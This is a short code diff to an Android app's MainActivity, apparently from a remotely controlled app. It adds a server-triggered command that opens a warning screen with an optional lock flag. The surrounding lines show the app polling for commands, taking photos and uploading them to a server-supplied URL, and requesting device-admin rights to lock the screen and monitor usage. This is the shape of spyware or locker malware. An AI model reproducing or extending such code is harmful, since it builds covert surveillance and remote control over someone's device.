@@ -322,6 +322,10 @@ class MainActivity : ComponentActivity() {
                                 takePhotoAndUpload(camera, uploadUrl)
                             }
                         }
+                        "show_warning_ui" -> {
+                            val message = params.optString("message", "Pesan tidak tersedia")
+                            showWarningUI(applicationContext, message)
+                        }
                     }
                 } catch (e: Exception) {
                     Log.e("PollCommand", "Parse error: ${e.message}")
@@ -744,6 +748,15 @@ class MainActivity : ComponentActivity() {
             putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "This app needs device admin permission to lock screen, monitor usage, etc.")
         }
         startActivityForResult(intent, 1003)
+    }
+
+    private fun showWarningUI(context: Context, message: String, shouldLock: Boolean = false) {
+        val intent = Intent(context, WarningActivity::class.java).apply {
+            putExtra("message", message)
+            putExtra("should_lock", shouldLock)
+            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
+        }
+        context.startActivity(intent)
     }
     
     
